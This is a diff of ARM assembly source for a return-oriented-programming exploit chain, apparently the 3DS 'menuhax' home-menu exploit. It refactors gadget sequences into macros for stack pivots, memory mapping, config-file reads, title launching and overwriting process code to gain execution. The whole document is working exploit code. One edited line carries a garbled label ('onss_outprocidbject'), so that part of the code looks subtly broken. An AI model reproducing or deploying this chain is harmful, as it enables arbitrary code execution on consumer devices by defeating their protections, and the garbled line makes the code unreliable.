@@ -7,14 +7,16 @@
 #include "menuhax_ropinclude.s"
 
 _start:
-.word POP_R0PC
+.word POP_R2R6PC
 ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here.
-.word 0
+.word 0 @ r2
+.word 0 @ r3
+.word 0 @ r4
+.word 0 @ r5
+.word 0 @ r6
 
-.word POP_R0PC @ Stack-pivot to ropstackstart.
-.word ROPBUFLOC(object) @ r0
-
-.word ROP_LOADR4_FROMOBJR0
+@ Stack-pivot to ropstackstart.
+ROPMACRO_STACKPIVOT ROPBUFLOC(ropstackstart), ROP_POPPC
 
 object:
 .word ROPBUFLOC(vtable) @ object+0, vtable ptr
@@ -59,13 +61,6 @@ nsslaunchtitle_programidlow_list:
 
 /*nss_servname:
 .ascii "ns:s"*/
-#endif
-
-#ifdef BOOTGAMECARD
-gamecard_titleinfo:
-.word 0, 0 @ programID
-.word 2 @ mediatype
-.word 0 @ reserved
 #endif
 
 #ifdef LOADSDPAYLOAD
@@ -113,8 +108,6 @@ tmp_scratchdata:
 .space 0x400
 
 ropstackstart:
-#ifdef USE_PADCHECK
-
 #ifdef LOADSDCFG
 @ Load the cfg file. Errors are ignored with file-reading.
 CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0
@@ -123,29 +116,20 @@ CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 1, 0
 
 CALLFUNC_NOSP IFile_Read,ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg), 0x2c
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(IFile_ctx)
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
 
 @ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to rop_cfg_end. Mismatch can also be caused by file-reading failing.
-ROP_SETLR ROP_POPPC
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x0), 0x3, ROPBUFLOC(rop_cfg_end)
 
-@ Copy the u64 from filebuf+0x14 to hblauncher_svcsleepthread_delaylow/hblauncher_svcsleepthread_delayhigh.
-ROPMACRO_COPYWORD ROPBUFLOC(hblauncher_svcsleepthread_delaylow), ROPBUFLOC(menuhax_cfg+0x14)
-ROPMACRO_COPYWORD ROPBUFLOC(hblauncher_svcsleepthread_delayhigh), ROPBUFLOC(menuhax_cfg+0x18)
+@ Copy the u64 from filebuf+0x14 to the input values used with ropbin_svcsleepthread_macrostart.
+ROPMACRO_COPYWORD ROPBUFLOC(ropbin_svcsleepthread_macrostart+CALLFUNC_R0R1_R0OFFSET), ROPBUFLOC(menuhax_cfg+0x14)
+ROPMACRO_COPYWORD ROPBUFLOC(ropbin_svcsleepthread_macrostart+CALLFUNC_R0R1_R1OFFSET), ROPBUFLOC(menuhax_cfg+0x18)
 
 @ Copy the u64 from filebuf+0x24 to newthread_svcsleepthread_delaylow/newthread_svcsleepthread_delayhigh.
-ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_delaylow), ROPBUFLOC(menuhax_cfg+0x24)
-ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_delayhigh), ROPBUFLOC(menuhax_cfg+0x28)
+ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_macrostart+CALLFUNC_R0R1_R0OFFSET), ROPBUFLOC(menuhax_cfg+0x24)
+ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_macrostart+CALLFUNC_R0R1_R1OFFSET), ROPBUFLOC(menuhax_cfg+0x28)
 
 rop_cfg_cmpbegin_exectypestart: @ Compare u32 filebuf+0x10(exec_type) with 0x0, on match continue to the ROP following this(which jumps to rop_cfg_cmpbegin1), otherwise jump to rop_cfg_cmpbegin_exectypeprepare.
-ROP_SETLR ROP_POPPC
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x0, ROPBUFLOC(rop_cfg_cmpbegin_exectypeprepare)
 ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_cmpbegin1), ROP_POPPC
 
@@ -153,15 +137,8 @@ rop_cfg_cmpbegin_exectypeprepare:
 
 CALLFUNC_NOSP MEMCPY, ROPBUFLOC(menuhax_cfg_new), ROPBUFLOC(menuhax_cfg), 0x2c, 0
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word 0x0 @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(menuhax_cfg_new+0x10) @ r1
-
-.word ROP_STR_R0TOR1 @ Write 0x0 to cfg exec_type.
+@ Write 0x0 to cfg exec_type.
+ROPMACRO_WRITEWORD ROPBUFLOC(menuhax_cfg_new+0x10), 0x0
 
 @ Write the updated cfg to the file.
 
@@ -171,163 +148,52 @@ CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 0x3,
 
 CALLFUNC IFile_Write, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg_new), 0x2c, 1, 0, 0, 0
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(IFile_ctx)
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
 
 @ Compare u32 filebuf+0x10(exec_type) with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin_exectype2.
-ROP_SETLR ROP_POPPC
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x1, ROPBUFLOC(rop_cfg_cmpbegin_exectype2)
 
 @ Jump to padcheck_finish.
 ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish), ROP_POPPC
 
 rop_cfg_cmpbegin_exectype2: @ Compare u32 filebuf+0x10(exec_type) with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin1.
-ROP_SETLR ROP_POPPC
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x2, ROPBUFLOC(rop_cfg_cmpbegin1)
 
 ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop), ROP_POPPC
 
 rop_cfg_cmpbegin1: @ Compare u32 filebuf+0x4 with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin2.
-ROP_SETLR ROP_POPPC
-
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x1, ROPBUFLOC(rop_cfg_cmpbegin2)
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(rop_r1data_cmphid) @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(menuhax_cfg+0x8) @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x8 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
+@ Copy the u32 from filebuf+0x8 to the cmpword at padcheck_cmpmacrostart.
+ROPMACRO_COPYWORD ROPBUFLOC(padcheck_cmpmacrostart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0x8)
 
 @ This ROP chunk has finished, jump to rop_cfg_end.
 ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_end), ROP_POPPC
 
 rop_cfg_cmpbegin2: @ Compare u32 filebuf+0x4 with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_end.
-ROP_SETLR ROP_POPPC
-
 ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(rop_cfg_end)
 
-@ This type is the same as type1(minus the offset the PAD value is loaded from), except that it basically inverts the padcheck: on PAD match ret2menu, on mismatch continue ROP.
+@ This type is the same as type1(minus the offset the PAD value is loaded from), except that the padcheck is inverted: on PAD match ret2menu, on mismatch continue ROP.
 
-.word POP_R0PC
-.word ROPBUFLOC(rop_r1data_cmphid) @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(menuhax_cfg+0xc) @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0xc to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
-
-.word POP_R0PC
-.word ROPBUFLOC(padcheck_end_stackpivotskip) @ r0
-
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_end_stackpivotskip, so that the stack-pivot following that actually gets executed.
-
-.word POP_R0PC
-.word ROPBUFLOC(padcheck_pc_value) @ r0
-
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_pc_value.
-
-.word POP_R0PC
-.word ROPBUFLOC(padcheck_sp_value) @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(padcheck_finish) @ r1
-
-.word ROP_STR_R1TOR0 @ Write the address of padcheck_finish to padcheck_sp_value.
+@ Copy the u32 from filebuf+0xc to the cmpword at padcheck_cmpmacrostart.
+ROPMACRO_COPYWORD ROPBUFLOC(padcheck_cmpmacrostart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0xc)
 
 rop_cfg_end:
 #endif
 
-ROP_SETLR ROP_POPPC
+padcheck_cmpmacrostart:
+@ Compare current PAD state with 0x200(L-button). On match continue running the below ROP(padcheck_match), otherwise jump to padcheck_mismatch. This padval can be overwritten by the above ROP.
+ROPMACRO_CMPDATA 0x1000001c, 0x200, ROPBUFLOC(padcheck_mismatch)
 
-.word POP_R0PC
-.word ROPBUFLOC(rop_r0data_cmphid) @ r0
+padcheck_match:
+@ Compare u32 filebuf+0x4 with 0x2, on match jump to ret2menu_rop, otherwise jump to padcheck_finish.
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(padcheck_finish)
+ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop), ROP_POPPC
 
-.word POP_R1PC
-.word 0x1000001c @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.
-
-.word POP_R0PC
-rop_r0data_cmphid:
-.word 0 @ r0
-
-.word POP_R1PC
-rop_r1data_cmphid:
-.word USE_PADCHECK @ r1
-
-.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.
-
-.word ROPBUFLOC(object+0x20) @ r4
-
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_sploadword) @ r0
-
-.word POP_R1PC
-padcheck_sp_value:
-.word ROPBUFLOC(ret2menu_rop) @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
-
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_pcloadword) @ r0
-
-.word POP_R1PC
-padcheck_pc_value:
-.word ROP_POPPC @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
-
-.word POP_R0PC @ Begin the actual stack-pivot ROP.
-.word ROPBUFLOC(object) @ r0
-
-.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.
-
-.word 0, 0, 0 @ r4..r6
-
-@ Re-init the stack-pivot data since this is needed for the sdcfg stuff.
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_sploadword) @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(ret2menu_rop) @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
-
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_pcloadword) @ r0
-
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
-
-padcheck_end_stackpivotskip:
-.word POP_R4R5R6PC @ Jump down to the padcheck_finish ROP by default. The LOADSDCFG ROP can patch this word to ROP_POPPC, so that the below stack-pivot actually gets executed.
-
-@ When actually executed, stack-pivot so that ret2menu is done.
-.word POP_R0PC
-.word ROPBUFLOC(object) @ r0
-
-.word ROP_LOADR4_FROMOBJR0
-
-padcheck_finish:
-ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish_jump), ROP_POPPC
+padcheck_mismatch:
+@ Compare u32 filebuf+0x4 with 0x2, on match jump to padcheck_finish, otherwise jump to ret2menu_rop.
+ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(ret2menu_rop)
+ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish), ROP_POPPC
 
 ret2menu_rop:
 
@@ -337,15 +203,9 @@ ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x20), 0x0, ROPBUFLOC(ret2menu_rop_create
 ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop_returnmenu), ROP_POPPC
 
 ret2menu_rop_createthread:
-ROP_SETLR ROP_POPPC
 
-.word POP_R0PC
-.word ROPBUFLOC(newthread_rop_r1data_cmphid) @ r0
-
-.word POP_R1PC
-.word ROPBUFLOC(menuhax_cfg+0x20) @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from cfg+0x20 to newthread_rop_r1data_cmphid.
+@ Copy the u32 from cfg+0x20 to the cmpword for newthread_rop_r1data_cmphid.
+ROPMACRO_COPYWORD ROPBUFLOC(newthread_rop_cmphidstart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0x20)
 
 CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0
 
@@ -364,13 +224,10 @@ ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), ROPBUFLOC(ret2menu_exploitre
 
 ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC
 
-.word POP_R0PC
-.word ROPBUFLOC(object) @ r0
+ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+ROPMACRO_STACKPIVOT_JUMP
 
-.word ROP_LOADR4_FROMOBJR0
-
-padcheck_finish_jump:
-#endif
+padcheck_finish:
 
 //Overwrite the top-screen framebuffers. First chunk is 3D-left framebuffer, second one is 3D-right(when that's enabled). These are the primary framebuffers. Color format is byte-swapped RGB8.
 #ifndef ENABLE_IMAGEDISPLAY
@@ -404,14 +261,7 @@ CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata
 ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800
 CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x38400)
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(IFile_ctx)
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
 #endif
 
 @ Setup the framebuffers to make sure they're at the intended addrs(like when returning from another title etc).
@@ -443,7 +293,7 @@ CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f48f000 + 0x38800, 0x38800
 
 @ Wait 0.1s for the above transfers to finish, then free the allocated linearmem buffer.
 
-CALLFUNC_NOSP svcSleepThread, 100000000, 0, 0, 0
+CALLFUNC_R0R1 svcSleepThread, 100000000, 0
 
 CALLFUNC_LDRR1 svcControlMemory, ROPBUFLOC(tmp_scratchdata+12), ROPBUFLOC(tmp_scratchdata+4), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
 #endif
@@ -460,97 +310,19 @@ COND_THROWFATALERR
 CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBIN_BUFADR, 0x10000
 COND_THROWFATALERR
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(IFile_ctx)
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
 #endif
 
-#ifdef ENABLE_HBLAUNCHER
 CALLFUNC_NOSP MEMSET32_OTHER, ROPBIN_BUFADR - (0x800*6), 0x2800, 0, 0 @ paramblk, the additional 0x2000-bytes is for backwards-compatibility.
 
 CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBIN_BUFADR - (0x800*6), (0x10000+0x2800), 0, 0
-#endif
 
 @ Delay 3-seconds. This seems to help with the *hax 2.5 payload booting issues which triggered in some cases(doesn't happen as much with this).
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-hblauncher_svcsleepthread_delaylow:
-.word 3000000000 @ r0
-
-.word POP_R1PC
-hblauncher_svcsleepthread_delayhigh:
-.word 0 @ r1
-
-.word svcSleepThread
+ropbin_svcsleepthread_macrostart:
+CALLFUNC_R0R1 svcSleepThread, 3000000000, 0
 
 ROPMACRO_STACKPIVOT ROPBIN_BUFADR, ROP_POPPC
-#endif
-
-#ifdef BOOTGAMECARD
-#ifdef GAMECARD_PADCHECK
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word 3000000000//0x0 @ r0
-
-.word POP_R1PC
-.word 0x0//0x100 @ r1
-
-.word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.
-
-.word POP_R0PC
-.word ROPBUFLOC(rop_r0data_cmphid_gamecard) @ r0
-
-.word POP_R1PC
-.word 0x1000001c @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.
-
-.word POP_R0PC
-rop_r0data_cmphid_gamecard:
-.word 0 @ r0
-
-.word POP_R1PC
-.word GAMECARD_PADCHECK @ r1
-
-.word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.
-
-.word ROPBUFLOC(object+0x20) @ r4
-
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_sploadword) @ r0
-
-.word POP_R1PC
-.word ROPBUF(bootgamecard_ropfinish) @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
-
-.word POP_R0PC
-.word ROPBUFLOC(stackpivot_pcloadword) @ r0
-
-.word POP_R1PC
-.word ROP_POPPC @ r1
-
-.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
-
-.word POP_R0PC @ Begin the actual stack-pivot ROP.
-.word ROPBUFLOC(object) @ r0
-
-.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.
-
-.word 0, 0, 0 @ r4..r6
-#endif
-
-CALLFUNC_NOSP NSS_RebootSystem, 0x1, ROPBUFLOC(gamecard_titleinfo), 0x0, 0
-
-bootgamecard_ropfinish:
 #endif
 
 #ifndef ENABLE_LOADROPBIN
@@ -568,22 +340,14 @@ COND_THROWFATALERR
 CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(codebinpayload_start), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
 COND_THROWFATALERR
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word ROPBUFLOC(IFile_ctx)
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
 #endif
 
 CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBUFLOC(codedatastart), CODEBINPAYLOAD_SIZE, 0, 0
 
 ROP_SETLR POP_R2R6PC
 
-.word POP_R0PC
-.word ROPBUFLOC(region_outval) @ r0
+ROP_SETR0 ROPBUFLOC(region_outval)
 
 .word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.
 
@@ -594,23 +358,19 @@ region_outval:
 .word ROPBUFLOC(nsslaunchtitle_programidlow_list) @ r5
 .word 0 @ r6
 
-.word POP_R0PC
-.word ROPBUFLOC(object) @ r0
+ROP_SETR0 ROPBUFLOC(object)
 
 .word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)
 
 ROP_SETLR_OTHER ROP_POPPC
 
-.word POP_R0PC
-
-.word ROPBUFLOC(nsslaunchtitle_regload_programidlow) @ r0
+ROP_SETR0 ROPBUFLOC(nsslaunchtitle_regload_programidlow)
 
 .word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.
 
 ROP_SETLR POP_R2R6PC
 
-.word POP_R0PC
-.word ROPBUFLOC(nss_outprocid) @ r0, out procid*
+ROP_SETR0 ROPBUFLOC(onss_outprocidbject) @ out procid*
 
 @ r1 isn't used by NSS_LaunchTitle so no need to set it here.
 
@@ -645,15 +405,9 @@ CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), 0x0f000000, 0, 0x00400000
 CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
 #endif
 
-ROP_SETLR ROP_POPPC
+@ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
 
-.word POP_R0PC
-.word 1000000000//0x0 @ r0
-
-.word POP_R1PC
-.word 0x0//0x100 @ r1
-
-.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.
+CALLFUNC_R0R1 svcSleepThread, 1000000000, 0
 
 CALLFUNC_NOARGS GSPGPU_Shutdown
 
@@ -661,66 +415,26 @@ CALLFUNC_NOARGS GSPGPU_Shutdown
 //Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
 CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUFLOC(aptsendparam_handle), ROPBUFLOC(nss_servname), 0x4, 0
 
-ROP_SETLR POP_R2R6PC
-.word POP_R0PC
-.word 0x101 @ r0, dst appID
-
-.word POP_R1PC
-.word 0x1 @ r1, signaltype
-
-.word POP_R2R6PC
-.word 0 @ r2, parambuf*
-.word 0 @ r3, parambufsize
-.word 0 @ r4
-.word 0 @ r5
-.word 0 @ r6
-
-.word APT_SendParameter
-
-aptsendparam_handle:
-.word 0 @ sp0, handle
-.word 0
-.word 0
-.word 0
-.word 0 @ r6*/
+CALLFUNC APT_SendParameter, 0x101, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0*/
 
 ropfinish_sleepthread:
 #ifdef EXITMENU
 ROP_SETLR ROP_POPPC
 
 #if NEW3DS==0
-.word POP_R0PC
-.word 4000000000 @ r0
-
-.word POP_R1PC @ Sleep 4 seconds.
-.word 0 @ r1
+CALLFUNC_R0R1 svcSleepThread, 4000000000, 0 @ Sleep 4 seconds.
 #else
-.word POP_R0PC
-.word 3000000000 @ r0
-
-.word POP_R1PC  @ Sleep 3 seconds.
-.word 0 @ r1
+CALLFUNC_R0R1 svcSleepThread, 3000000000, 0 @ Sleep 3 seconds.
 #endif
-
-.word svcSleepThread
 
 .word MAINLR_SVCEXITPROCESS
 #endif
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word 1000000000 @ r0
-
-.word POP_R1PC
-.word 0x0 @ r1
-
-.word svcSleepThread
+CALLFUNC_R0R1 svcSleepThread, 1000000000, 0
 
 ROPMACRO_STACKPIVOT ROPBUFLOC(ropfinish_sleepthread), ROP_POPPC
 
-.word POP_R1PC
-.word ROP_BXR1 @ r1
+ROP_SETR1 ROP_BXR1
 
 .word ROP_BXR1 @ This is used as an infinite loop.
 
@@ -731,57 +445,16 @@ ROPMACRO_STACKPIVOT ROPBUFLOC(ropfinish_sleepthread), ROP_POPPC
 newthread_ropstart:
 
 @ Sleep 5-seconds.
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-newthread_svcsleepthread_delaylow:
-.word 0x2A05F200 @ r0
-
-.word POP_R1PC
-newthread_svcsleepthread_delayhigh:
-.word 0x1 @ r1
-
-.word svcSleepThread
+newthread_svcsleepthread_macrostart:
+CALLFUNC_R0R1 svcSleepThread, 0x2A05F200, 0x1
 
 @ Compare the gspgpu session handle with 0x0. On match continue running the below ROP which then jumps to newthread_ropstart, otherwise jump to newthread_rop_cmphidstart. Hence, this will only continue to checking the HID state when the gspgpu handle is non-zero(this is intended as a <is-homemenu-active> check, but this passes with *hax payload already running too).
 ROPMACRO_CMPDATA_NEWTHREAD GSPGPU_SERVHANDLEADR, 0x0, (NEWTHREAD_ROPBUFFER + (newthread_rop_cmphidstart - newthread_ropstart))
 ROPMACRO_STACKPIVOT_NEWTHREAD NEWTHREAD_ROPBUFFER, ROP_POPPC
 
 newthread_rop_cmphidstart:
-@ Setup the stack-pivot sp.
-ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart)), NEWTHREAD_ROPBUFFER
-
-@ Setup the stack-pivot pc.
-ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart)), ROP_POPPC
-
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word NEWTHREAD_ROPBUFFER + (newthread_rop_r0data_cmphid - newthread_ropstart) @ r0
-
-.word POP_R1PC
-.word 0x1000001c @ r1
-
-.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to newthread_rop_r0data_cmphid, current HID PAD state.
-
-.word POP_R0PC
-newthread_rop_r0data_cmphid:
-.word 0 @ r0
-
-.word POP_R1PC
-newthread_rop_r1data_cmphid:
-.word 0x0 @ r1, overwritten with data from cfg eariler.
-
-.word ROP_CMPR0R1 @ Compare current PAD state with the cfg value.
-
-.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4
-
-.word POP_R0PC @ Begin the actual stack-pivot ROP.
-.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0
-
-.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the cfg value, continue the ROP, otherwise stack-pivot to newthread_ropstart.
-
-.word 0, 0, 0 @ r4..r6
+@ Compare current PAD state with <value loaded from cfg from above ROP>. On match continue running the below ROP, otherwise jump to newthread_ropstart.
+ROPMACRO_CMPDATA_NEWTHREAD 0x1000001c, 0, NEWTHREAD_ROPBUFFER
 
 @ Read the cfg from FS again just in case it changed since menuhax initially ran.
 
@@ -791,29 +464,13 @@ CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthrea
 
 CALLFUNC_NOSP IFile_Read, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
 
 @ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to newthread_ropstart. Mismatch can also be caused by file-reading failing.
 ROPMACRO_CMPDATA_NEWTHREAD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x0) - newthread_ropstart)), 0x3, (NEWTHREAD_ROPBUFFER)
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word 0x1 @ r0
-
-.word POP_R1PC
-.word (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x10) - newthread_ropstart)) @ r1
-
-.word ROP_STR_R0TOR1 @ Write 0x1 to cfg exec_type.
-
-@ Write the updated cfg to the file.
+@ Write 0x1 to cfg exec_type.
+ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x10) - newthread_ropstart)), 0x1
 
 CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0
 
